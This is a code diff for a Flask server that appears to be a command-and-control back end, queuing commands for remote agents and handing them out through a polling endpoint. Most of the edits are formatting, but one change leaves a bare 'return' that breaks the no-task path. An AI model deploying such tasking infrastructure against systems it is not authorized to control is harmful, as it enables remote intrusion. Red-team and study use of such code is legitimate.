@@ -54,7 +54,7 @@ def create_task():
     if data == None:
         return jsonify({"status": "bad task!"})
 
-    # error checking 
+    # error checking
     task_type = data.get("type")
     task_command = data.get("cmd")
     agent_id = data.get("agent_id")
@@ -63,15 +63,16 @@ def create_task():
         return jsonify({"status": "no agent with that ID"})
     task = Task(
         job_id= make_job_id() ,
-        command_type = task_type, 
-        cmd = task_command, 
+        command_type = task_type,
+        cmd = task_command,
         Status=CREATED,
         agent_id= agent_id
     )
     db.session.add(task)
     db.session.commit()
     print(f"[+] A new task has been created for {agent_id}")
-    return jsonify({"status": "ok", "message": task.job_id})
+    return jsonify({ "job_id": task.job_id, "agent_id":agent_id, "command":task_command, "arguments":[""] , "status": TASKED,})
+
 
 @app.route("/tasks/list", methods=["GET"])
 def list_tasks():
@@ -91,7 +92,7 @@ def tasking():
     data = request.json
     if data == None:
         return jsonify({"status": "Bad", "message": "boo you!"})
-    
+
     job_id = data.get("job_id")
     agent_id = data.get("agent_id")
     task_result = data.get("task_response")
@@ -107,11 +108,11 @@ def tasking():
                 task.Status = DONE
                 db.session.commit()
 
-            # we need to set the task to compiled 
+            # we need to set the task to compiled
 
     agent = find_agent_by_id(agent_id)
 
-    # invalid agent 
+    # invalid agent
     if agent == None:
         template_vars = {
             "status": "Bad",
@@ -122,22 +123,20 @@ def tasking():
             'error.html',
             status = "Bad",
             message = "Bad Agent"
-         )
-         #jsonify({"status": "Bad", "message": "Bad agent!"})
-    
+        )
+        #jsonify({"status": "Bad", "message": "Bad agent!"})
+
     task = Task.query.filter_by(agent_id=agent_id, Status = CREATED).first()
     if task == None:
         # no work to be done
 
-        return render_template(
-            'outPut.html'
-        )
+        return
     else:
         # have tasked the agent
         task.Status = TASKED
         db.session.commit()
         t=[{
-            "status": "ok",
+            "status": task.Status,
             "type": task.command_type,
             "cmd": task.cmd,
             "job_id": task.job_id,
@@ -147,9 +146,6 @@ def tasking():
             'outPut.html',
             t=t
         )
-
-
-
 
 
 
